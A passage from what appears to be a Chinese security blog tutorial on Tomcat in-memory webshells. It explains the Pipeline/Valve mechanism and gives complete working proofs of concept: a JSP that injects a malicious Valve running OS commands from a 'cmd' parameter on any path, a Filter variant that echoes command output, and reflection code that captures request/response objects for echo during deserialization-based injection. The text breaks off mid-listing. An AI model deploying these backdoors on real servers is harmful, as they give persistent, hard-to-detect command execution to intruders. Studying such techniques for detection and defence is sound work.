src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010647020.png" alt="image-20230201064710941"></p><blockquote><p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p></blockquote><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>需要先了解一下tomcat中的管道机制</p><p>Tomcat 在处理一个请求调用逻辑时需要传递Request 和 Respone 对象，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p><p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010646623.png" alt="image-20230201064647521"></p><blockquote><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p></blockquote><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>先来简单看一下接口的定义，<code>org.apache.catalina.Pipeline</code> 的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//增加阀门*</span><br>    <span class="hljs-keyword">public</span> Valve[] getValves();<span class="hljs-comment">//获取</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//移除</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取首个</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<span class="hljs-comment">//是否支持异步*</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.catalina.Valve</code> 的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span> &#123;<br>    <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Contained) &#123;<br>        ((Contained) valve).setContainer(<span class="hljs-built_in">this</span>.container);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (getState().isAvailable()) &#123;<br>        <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ((Lifecycle) valve).start();<br>            &#125; <span class="hljs-keyword">catch</span> (LifecycleException e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardPipeline.valve.start&quot;</span>), e);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>) &#123;<br>        first = valve;<br>        valve.setNext(basic);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Valve</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (current.getNext() == basic) &#123;<br>                current.setNext(valve);<br>                valve.setNext(basic);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            current = current.getNext();<br>        &#125;<br>    &#125;<br><br>    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p></blockquote><p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//...</span><br>        postParseSuccess = postParseRequest(req, request, res, response);<br>        <span class="hljs-keyword">if</span> (postParseSuccess) &#123;<br>            request.setAsyncSupported(<br>                    connector.getService().getContainer().getPipeline().isAsyncSupported());<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(<br>                    request, response);<span class="hljs-comment">//调用invoke</span><br></code></pre></td></tr></table></figure><p>这样思路就很清晰了，我们只要写一个恶意Valve为了方便可以继承<code>ValveBase</code>，然后将恶意代码写在invoke方法中,之后只要先通过<code>StandardContext</code>对象获取<code>StandardPipeline</code>，这样就可以利用<code>StandardPipeline.addValve()</code>动态添加Valve</p><h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><p>加载Valve</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp<br></code></pre></td></tr></table></figure><p>之后可以任意路径命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010705853.png" alt="image-20230201070553758"></p><h2 id="0x02-内存马回显技术"><a href="#0x02-内存马回显技术" class="headerlink" title="0x02 内存马回显技术"></a>0x02 内存马回显技术</h2><h3 id="回显示例"><a href="#回显示例" class="headerlink" title="回显示例"></a>回显示例</h3><p>可以利用之前的Tomcat Filter型内存马获取回显,修改一下恶意Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br> <br>                <span class="hljs-comment">//将命令执行结果写入扫描器并读取所有输入</span><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010710660.png" alt="image-20230201071005531"></p><h3 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h3><p>实验环境:Tomcat 9.0.77 (Tomcat10后部分源码逻辑修改,以及一些反射使用会报NullPointerException)</p><p>如果用Tomcat的内存马，需要JSP文件，当我们需要反序列化漏洞来注入内存马是，需要其他的方法获取request和response对象。</p><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中找到这样两个变量*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FilterChain</span> &#123;<br><br>    <span class="hljs-comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><blockquote><p>并且这两个属性还是静态的,默认赋值</p></blockquote><p>在<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会将request对象和response对象存储到这两个变量中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;<br>    lastServicedRequest.set(request);<br>    lastServicedResponse.set(response);<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>这里有一个条件<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,默认值为false，但可以反射修改</p></blockquote><p>总结一下思路</p><ol><li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li><li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li><li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br> <br><span class="hljs-meta">@WebServlet(&quot;/echo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//反射获取所需属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">WRAP_SAME_OBJECT_FIELD</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br> <br>            <span class="hljs-comment">//使用modifiersField反射修改final型变量</span><br>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br>            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br> <br>            <span class="hljs-comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><br>            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-literal">null</span>))&#123;<br>                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-literal">null</span>,<span class="hljs-literal">true</span>);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedRequestField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedResponseField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-comment">//获取request变量</span><br>            <span class="hljs-keyword">if</span>(lastServicedRequestField.get(<span class="hljs-literal">null</span>)!=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">threadLocal</span> <span class="hljs-operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br>                <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (ServletRequest) threadLocal.get();<br>                System.out.println(servletRequest);<br>                System.out.println((HttpServletRequest) servletRequest == req);<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次请求将request和response对象存储进变量中，第二次请求才获取到request</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(servletRequest);<br>System.out.println((HttpServletRequest) servletRequest == req);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010824372.png" alt="image-20230201082439227"></p><h3 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>在<code>AbstractProcessor</code>类中，我们能够找到全局response,在Tomcat调用栈中调用了<code>Http11Processor#service</code>方法,而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象</p><p>调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="hljs-built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response<br></code></pre></td></tr></table></figure><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 